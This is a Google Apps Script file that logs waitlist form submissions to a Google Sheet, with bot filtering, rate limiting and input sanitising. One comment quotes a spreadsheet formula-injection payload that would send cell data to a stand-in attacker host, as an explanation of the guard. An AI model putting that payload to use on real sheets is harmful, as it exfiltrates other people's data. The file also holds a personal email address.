// Google Apps Script — appends each waitlist submission to a Sheet.
//
// SETUP
// 1. Create a Google Sheet (any name).
// 2. Extensions -> Apps Script. Delete the stub, paste this file, save (Cmd+S).
// 3. Set NOTIFY below to your email (or "" to skip notifications).
// 4. Deploy -> New deployment -> type "Web app"
//      Execute as:     Me
//      Who has access: Anyone        <- not "Anyone with a Google account"
// 5. Copy the /exec URL into FORM_ENDPOINT in index.html.
//
// After ANY edit here: Deploy -> Manage deployments -> edit -> New version.
// The old version keeps serving until you do.

var NOTIFY = "bn.barak@gmail.com";   // "" disables email entirely
var MAX_PER_HOUR = 20;  // caps how many rows land per hour

var LIMITS = { name: 100, company: 120, email: 160, message: 2000 };

function doPost(e) {
  var lock = LockService.getScriptLock();
  lock.waitLock(20000);
  try {
    var p = (e && e.parameter) || {};

    // Honeypot: hidden from humans. Filled means bot. Answer ok so it learns nothing.
    if (p.website) return ok_();

    var name    = clean_(p.name,    LIMITS.name,    true);
    var company = clean_(p.company, LIMITS.company, true);
    var email   = clean_(p.email,   LIMITS.email,   true);
    var message = clean_(p.message, LIMITS.message, false);

    if (!name) return ok_();
    if (!/^[^\s@]+@[^\s@]+\.[a-z]{2,}$/i.test(email)) return ok_();

    var ss = SpreadsheetApp.getActiveSpreadsheet();
    var sheet = ss.getSheetByName("Waitlist") || ss.insertSheet("Waitlist");
    if (sheet.getLastRow() === 0) {
      sheet.appendRow(["Timestamp", "Name", "Company", "Email", "Message"]);
    }

    // Rate limit on rows written in the last hour
    var last = sheet.getLastRow();
    if (last > 1) {
      var back = Math.min(last - 1, MAX_PER_HOUR);
      var cutoff = Date.now() - 3600 * 1000;
      var recent = sheet.getRange(last - back + 1, 1, back, 1).getValues()
        .filter(function (r) { return r[0] instanceof Date && r[0].getTime() > cutoff; })
        .length;
      if (recent >= MAX_PER_HOUR) return ok_();
    }

    sheet.appendRow([new Date(), name, company, email, message]);

    // Force the text columns to plain text so nothing is ever evaluated
    sheet.getRange(sheet.getLastRow(), 2, 1, 4).setNumberFormat("@");

    if (NOTIFY) {
      MailApp.sendEmail(
        NOTIFY,
        "Waitlist — " + (company || name),
        "Name: " + name +
        "\nCompany: " + (company || "-") +
        "\nEmail: " + email +
        "\n\n" + (message || "")
      );
    }
    return ok_();
  } catch (err) {
    return ok_();  // never leak a stack trace to the caller
  } finally {
    lock.releaseLock();
  }
}

/**
 * Strip control characters, collapse whitespace, cap length, and neutralize
 * spreadsheet formula injection.
 *
 * The formula guard is the important one. A submission of
 *   =IMPORTXML("https://attacker.example/?d="&A1,"//x")
 * would otherwise be evaluated by Sheets as a live formula and could pull
 * data out of your spreadsheet to a third party. Prefixing with an
 * apostrophe makes Sheets store it as literal text.
 */
function clean_(value, max, singleLine) {
  var s = String(value == null ? "" : value);
  s = s.replace(/[\x00-\x1F\x7F]/g, " ");
  s = singleLine ? s.replace(/\s+/g, " ") : s.replace(/[ \t]+/g, " ");
  s = s.trim().slice(0, max);
  if (/^[=+\-@]/.test(s)) s = "'" + s;
  return s;
}

function ok_() {
  return ContentService
    .createTextOutput(JSON.stringify({ ok: true }))
    .setMimeType(ContentService.MimeType.JSON);
}
